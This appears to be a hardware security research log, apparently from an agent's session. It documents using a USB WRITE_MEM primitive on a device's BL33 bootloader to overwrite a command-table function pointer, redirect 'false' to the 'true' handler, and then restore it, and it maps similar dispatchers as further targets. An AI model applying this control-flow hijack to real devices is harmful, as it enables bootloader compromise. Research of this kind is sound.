# BL33 cmd redirect round 42: WRITE 8B -> function pointer -> legitimate handler

date: 2026-10-01. live, on device. BL33 in RAM, `1b8e:c003`, stage 16.
base: round39 (WRITE_MEM 0x01), round40 (double consumption), round41 (cmd_tbl map).
no RUN_IN_ADDR, shellcode, instruction, page table, BL31, flash/eMMC touched.

## 0. answer

```text
A=false idx43 entry 0x37f616c0 slot 0x37f616d0 orig 0x37e36764
B=true  idx101 entry 0x37f621a0 slot 0x37f621b0 handler 0x37e3676c
WRITE 8B 0x37f616d0 <- 6c 67 e3 37 00 00 00 00, readback 0x02 and mread ok
trigger false: before b'failed:' after b'success' (=true handler)
restore 8B orig, double readback ok, false back to b'failed:', session stage 16 alive
mmc/store/env dispatchers: same shape ldr x4,[x?,#0x10]+blr x4, sub-tables live==offline
```

## 1. read-only before

```text
false idx43 0x37f616c0: nameptr 0x37ec7389(b'false') max64 rep1 handler 0x37e36764 usage 0x37ec738f
true idx101 0x37f621a0: nameptr 0x37edc333(b'true') max64 rep1 handler 0x37e3676c usage 0x37ec7370
echo idx34 handler 0x37e28000, version idx110 handler 0x37e26688, all in 0x37e18000..0x37ff0000
dispatcher 0x37e5f6e8 live == offline (f9 40 0a 64 = ldr x4,[x19,#0x10])
handler code live==offline, name/usage strings live==offline
mread(0x34+0x33) == 0x02 for both entries
baseline same session: false->b'failed:', true->b'success', echo/version/help->b'success'
```

chosen pair: A=false, B=true. reason: identical maxargs/rep (64/1),
adjacent 1-instruction handlers (mov w0,#1 vs mov w0,#0 + ret),
1-byte delta (0x64->0x6c), binary discriminator in bulk reply head,
no storage/hardware. version/echo discarded as B because reply head
and `success` equal to true, no discrimination.

## 2. test

log: /tmp/opencode/redirect_result.txt (single session, one process).

```text
BEFORE slot 0x37f616d0 = 64 67 e3 37 00 00 00 00, full entry match offline
WRITE 0x01 0x37f616d0 <- 6c 67 e3 37 00 00 00 00 (8B, one transfer)
MID 0x02 = 6c 67 e3 37..., mread = 0x02, only-slot-changed True
TRIGGER bulkcmd false -> b'success' (before b'failed:')
RESTORE <- 64 67 e3 37..., 0x02 ok, mread ok, match02 True
RE-TRIGGER false -> b'failed:' True, true -> b'success', identify stage 16
```

no crash, no wedge, no power-cycle. rest of entry untouched
(name/max/rep/usage/help/complete).

## 3. other dispatchers, map-only read-only

same shape, all `ldr x4,[x?,#0x10]` + `blr x4`, no mask:

```text
mmc   0x37e2ca3c: ldr x4,[x19,#0x10] at 0x37e2cae4 + blr x4 at 0x37e2caf0, table 0x37ee5bc0
store 0x37e33900: ldr x4,[x0,#0x10] at 0x37e3394c + blr x4 at 0x37e3395c, table 0x37ee62f0
env   0x37e57d6c: ldr x4,[x0,#0x10] at 0x37e57db4 + blr x4 at 0x37e57dc8, table 0x37ee70f8
vpu/fastboot glue 0x37e3a8cc: ldr x4,[x0,#0x10] + blr x4 (sub-table same shape)
sub-tables live==offline on first 2 entries of each (info/read, init/exit, default/delete)
dispatchers live==offline 16B; handlers 116/116 in BL33 already OFFLINE_ONLY round41
usb/fastboot state 0x37f62550 / 0x37f62638 and bss 0x37f60cc0: read, BSS varies per session, no write
```

NOT TESTED: any WRITE to these sub-tables. read-only this round.

## 4. verdict

1. Does cmd_tbl[i].cmd control flow in BL33? CONFIRMED, observed on device.
2. Does WRITE_MEM alter 64-bit function pointer? CONFIRMED, 8B + double readback.
3. Command redirected to another legitimate handler? CONFIRMED, false->true.
4. Observable and reversible effect? CONFIRMED, failed:/success/failed: + double restore.
5. Other dispatchers equivalent? PROBABLE, same instruction + tables live==offline, NOT HARDWARE_REPRODUCED with WRITE.
6. Next test lowest risk/highest value: repeat false->true shape in harmless sub-table
   (e.g. env `default`->`print`? only if handler is display-only) or echo->version pair with
   output capture; never RUN, never flash/eMMC/efuse/boot/reset.

real risk: incomplete bulk (`upload` without args) drops gadget with no write;
use only complete commands with drain via 0x33. nothing persistent left.
